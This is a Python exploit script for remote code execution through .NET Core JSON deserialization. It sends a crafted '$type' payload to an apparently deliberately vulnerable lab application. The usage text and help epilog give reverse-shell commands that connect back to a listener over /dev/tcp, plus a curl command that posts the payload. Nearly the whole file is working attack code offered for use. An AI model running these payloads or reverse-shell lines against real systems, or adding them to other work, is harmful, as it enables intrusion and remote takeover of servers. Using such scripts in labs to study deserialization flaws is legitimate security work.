#!/usr/bin/env python3
"""
Simple .NET Core JSON Deserialization RCE
Uses direct ProcessStartInfo deserialization

Usage (replace with your IPs):
# Reverse shell (replace with your IP and start a listener first)
python3 csharp-json-exploit-simple.py \
  -u http://192.168.56.102:30081 \
  -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# or, with curl
PAYLOAD='{"data": "{\"$type\":\"VulnerableApp.Controllers.CommandExecutor, VulnerableApp\",\"Command\":\"touch /tmp/pwned\"}"}'

# Send to target
curl -X POST http://192.168.56.102:30081/vulnerable/process \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"

References:
- [Newtonsoft.Json TypeNameHandling Vulnerability](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html)
- [ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [OWASP: Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

"""

import argparse
import json
import requests
import sys

def generate_payload(command):
    """
    Generate payload using the custom CommandExecutor gadget
    The Command property setter will execute the command during deserialization
    """
    payload = {
        "$type": "VulnerableApp.Controllers.CommandExecutor, VulnerableApp",
        "Command": command
    }

    return json.dumps(payload)

def exploit(url, payload):
    """Send the exploit payload to the target"""
    target_url = f"{url.rstrip('/')}/vulnerable/process"

    data = {
        "data": payload
    }

    print(f"[*] Sending payload to {target_url}")
    print(f"[*] Payload: {payload}")

    try:
        response = requests.post(
            target_url,
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=10
        )

        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response: {response.text}")

        if response.status_code == 200:
            print("[+] Request successful!")
            return True
        else:
            print("[-] Request failed")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description='Simple .NET Core JSON Deserialization RCE',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -u http://192.168.56.102:30081 -c "touch /tmp/pwned"
  %(prog)s -u http://192.168.56.102:30081 -c "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
        '''
    )

    parser.add_argument('-u', '--url', required=True,
                        help='Target URL')
    parser.add_argument('-c', '--command', required=True,
                        help='Command to execute')

    args = parser.parse_args()

    payload = generate_payload(args.command)
    success = exploit(args.url, payload)
    sys.exit(0 if success else 1)

if __name__ == '__main__':
    main()
